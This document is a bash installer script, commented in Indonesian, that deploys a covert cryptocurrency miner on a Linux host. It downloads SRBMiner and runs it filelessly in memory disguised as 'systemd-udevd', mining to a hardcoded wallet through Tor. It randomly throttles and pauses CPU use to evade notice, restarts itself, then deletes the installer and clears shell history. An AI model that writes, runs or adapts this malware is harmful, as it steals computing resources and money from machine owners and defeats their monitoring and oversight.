#!/bin/bash
set -e

# ===========================================
#   MEMULAI INSTALASI KAMUFLASE OTOMATIS
# ===========================================

# 1. Pastikan dijalankan sebagai root
if [ "$EUID" -ne 0 ]; then
  echo "Error: Harap jalankan script ini sebagai root (gunakan sudo)!"
  exit 1
fi

echo "==========================================="
echo "   MEMULAI INSTALASI KAMUFLASE OTOMATIS    "
echo "==========================================="

# 2. Update dan Install Dependencies
echo "[*] Menginstal dependencies..."
apt-get update -y >/dev/null 2>&1
apt-get install -y wget tar xz-utils cpulimit procps tor python3 curl >/dev/null 2>&1

# Pastikan Tor berjalan
systemctl daemon-reload >/dev/null 2>&1 || true
systemctl start tor >/dev/null 2>&1 || true
systemctl enable tor >/dev/null 2>&1 || true

# 3. Buat direktori rahasia
FAKE_DIR="/usr/share/.systemd-cache"
mkdir -p "$FAKE_DIR"
cd "$FAKE_DIR"

# 4. Buat Fileless Memory Loader (SUDAH DIPERBAIKI)
echo "[*] Membuat Fileless Memory Loader..."
cat << 'PY_EOF' > run_memory.py
import urllib.request
import tarfile
import io
import lzma
import os
import sys
import time
import subprocess

URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz"
POOL = "stratum+ssl://ap.luckpool.net:13960"
WALLET = "RXkkitXME1JCdSLmEQi9avpHoY2udY2tFn.abel"
PROXY = "socks5://127.0.0.1:9050"

def main():
    print("[*] Downloading SRBMiner...")
    try:
        response = urllib.request.urlopen(URL, timeout=60)
        compressed_data = response.read()
    except Exception as e:
        print(f"Download failed: {e}")
        sys.exit(1)

    print("[*] Extracting binary from archive...")
    try:
        xz_dec = lzma.decompress(compressed_data)
        tar_io = io.BytesIO(xz_dec)
        binary_bytes = None
        
        with tarfile.open(fileobj=tar_io) as tar:
            for member in tar.getmembers():
                if "SRBMiner" in member.name and not member.name.endswith(('/', '.txt', '.md')):
                    f = tar.extractfile(member)
                    if f:
                        binary_bytes = f.read()
                        print(f"[+] Found binary: {member.name}")
                        break
                    
        if not binary_bytes:
            print("Binary not found in archive")
            sys.exit(1)
    except Exception as e:
        print(f"Extraction failed: {e}")
        sys.exit(1)

    print("[*] Loading miner into memory...")
    try:
        fd = os.memfd_create("systemd-udevd", flags=0)
        os.write(fd, binary_bytes)
        fd_path = f"/proc/self/fd/{fd}"
        
        args = [
            "systemd-udevd",
            "--disable-gpu",
            "--algorithm", "verushash",
            "--pool", POOL,
            "--wallet", WALLET,
            "--password", "x",
            "--proxy", PROXY,
            "--cpu-threads", str(os.cpu_count() or 4),
            "--nicehash", "0"
        ]
        
        os.execve(fd_path, args, os.environ)
    except Exception as e:
        print(f"Memory execution failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
PY_EOF

# 5. Buat Dynamic CPU Limiter (SUDAH DIPERBAIKI & LEBIH STABIL)
echo "[*] Membuat Dynamic CPU Limiter..."
cat << 'SH_EOF' > dynamic_limit.sh
#!/bin/bash
MINER_NAME="systemd-udevd"
HELPER_BIN="./systemd-helper"
LIMIT_BIN="/usr/bin/cpulimit"

# Salin cpulimit dengan nama samaran
if [ ! -f "$HELPER_BIN" ]; then
    cp "$LIMIT_BIN" "$HELPER_BIN"
    chmod +x "$HELPER_BIN"
fi

cleanup() {
    pkill -f "$MINER_NAME" 2>/dev/null || true
    pkill -f "systemd-helper" 2>/dev/null || true
    exit 0
}

trap cleanup SIGTERM SIGINT SIGQUIT

echo "[*] Dynamic CPU limiter started for $MINER_NAME"

while true; do
    PID=$(pgrep -f "$MINER_NAME" | head -n 1)

    if [ -n "$PID" ]; then
        VAL=$((8 + RANDOM % 17))
        CORES=$(nproc)
        TOTAL_LIMIT=$((CORES * VAL))
        
        pkill -f "systemd-helper" 2>/dev/null || true
        
        $HELPER_BIN -p "$PID" -l "$TOTAL_LIMIT" >/dev/null 2>&1 &
        
        sleep $((300 + RANDOM % 300))
        
        if [ $((RANDOM % 10)) -eq 0 ]; then
            kill -STOP "$PID" 2>/dev/null || true
            pkill -f "systemd-helper" 2>/dev/null || true
            sleep $((120 + RANDOM % 60))
            kill -CONT "$PID" 2>/dev/null || true
        fi
    else
        echo "[*] Miner not found, restarting..."
        nohup python3 run_memory.py >/dev/null 2>&1 &
        sleep 15
    fi
done
SH_EOF

chmod +x dynamic_limit.sh run_memory.py

# 6. Jalankan di background
echo "[*] Menjalankan kamuflase di background..."
nohup ./dynamic_limit.sh >/dev/null 2>&1 &

echo "==========================================="
echo "        KAMUFLASE TELAH BERHASIL DIAKTIFKAN!"
echo "==========================================="
echo "Status:"
echo "✓ Miner berjalan di RAM dengan nama 'systemd-udevd'"
echo "✓ Traffic melalui Tor (SOCKS5)"
echo "✓ CPU usage acak 8% - 24% per core"
echo "✓ Dynamic limiter + self restart"
echo "==========================================="
echo "Installer akan self-destruct dalam 5 detik..."
echo "==========================================="

sleep 5
rm -f "$0"
history -c 2>/dev/null || true
